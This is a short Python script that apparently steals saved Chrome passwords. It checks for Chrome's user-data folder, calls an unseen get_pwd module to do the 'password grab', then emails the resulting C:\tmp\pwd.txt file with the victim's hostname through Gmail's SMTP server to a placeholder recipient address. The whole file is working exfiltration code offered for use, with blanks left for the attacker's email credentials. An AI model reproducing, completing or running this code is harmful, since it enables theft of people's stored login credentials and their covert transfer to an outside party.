import os
import socket
import smtplib, ssl
from email.message import EmailMessage
import get_pwd

#Get device name:
dev_name = socket.gethostname()

#Detect whether chrome exists or not
local_computer_directory_path = os.path.join(
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
      "User Data", "Local State")

print("Checking for chrome directory...")
if os.path.exists(local_computer_directory_path) == True:
    print("Directory exists...proceeding with password grab...")
    grab_status = "Success"
    get_pwd.main()
else:
    print("Directory does not exist. Cancelled grab.")
    grab_status = "Chrome not installed - Failed"

#Send the Email
sender = "youremail@gmail.com"
recipient = "recipient@gmail.com"
app_password = "app password goes here"

print('Delivering Email...')
msg = EmailMessage()
msg.set_content(f"Password grab from {dev_name}\nGrab status: {grab_status}")
msg["Subject"] = f"Password grab from {dev_name}"
msg["From"] = sender
msg["To"] = recipient

if os.path.exists(local_computer_directory_path) == True:
    with open('C:\\tmp\\pwd.txt', 'rb') as txt:
        msg.add_attachment(txt.read(), maintype='application', subtype='octet-stream', filename=txt.name)   

context=ssl.create_default_context()

with smtplib.SMTP("smtp.gmail.com", port=587) as smtp:
    smtp.starttls(context=context)
    smtp.login(msg["From"], app_password)
    smtp.send_message(msg)